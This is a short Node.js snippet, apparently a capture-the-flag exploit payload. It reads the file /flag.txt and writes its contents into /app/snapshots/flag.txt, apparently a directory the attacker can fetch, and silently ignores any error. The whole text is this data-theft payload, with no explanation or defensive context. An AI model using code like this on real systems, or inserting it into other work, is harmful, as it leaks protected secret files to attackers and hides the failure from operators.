const fs = require("fs");

try {
  const flag = fs.readFileSync("/flag.txt", "utf8");
  fs.writeFileSync("/app/snapshots/flag.txt", flag);
} catch (e) {}
